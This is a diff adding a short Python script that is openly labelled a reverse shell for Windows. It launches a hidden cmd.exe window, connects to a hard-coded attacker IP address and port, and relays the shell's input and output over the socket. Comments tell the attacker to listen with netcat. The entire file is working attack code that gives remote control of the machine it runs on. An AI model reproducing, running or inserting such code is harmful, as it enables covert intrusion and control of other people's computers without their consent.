@@ -1,0 +1,55 @@
+import socket
+import os
+import threading
+import subprocess as sp
+
+# Reverse Shell in Python 3.12.5
+# Commands to use at attackers machine
+# 1. ip a s eth0
+# 2. nc -lvp 5002
+
+# Define the target IP address and port at the top
+TARGET_IP = "192.168.232.130"  # Replace with your IP address
+TARGET_PORT = 5002  # Replace with your desired port number
+
+
+def handle_output(p, s):
+    while True:
+        output = os.read(p.stdout.fileno(), 1024)
+        if output:
+            s.send(output)
+
+
+def handle_input(p, s):
+    while True:
+        input = s.recv(1024)
+        if input:
+            os.write(p.stdin.fileno(), input)
+
+
+def reverse_shell():
+    # Use the CREATE_NO_WINDOW flag to prevent the command prompt window from appearing
+    startupinfo = sp.STARTUPINFO()
+    startupinfo.dwFlags |= sp.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = sp.SW_HIDE
+
+    # Start a subprocess with cmd.exe without opening a window
+    p = sp.Popen(
+        ["cmd.exe"],
+        stdin=sp.PIPE,
+        stdout=sp.PIPE,
+        stderr=sp.STDOUT,
+        startupinfo=startupinfo,
+    )
+
+    # Create a socket connection to the attacker's machine
+    s = socket.socket()
+    s.connect((TARGET_IP, TARGET_PORT))
+
+    # Start threads to handle input and output
+    threading.Thread(target=handle_output, args=(p, s), daemon=True).start()
+    threading.Thread(target=handle_input, args=(p, s)).start()
+
+
+if __name__ == "__main__":
+    reverse_shell()
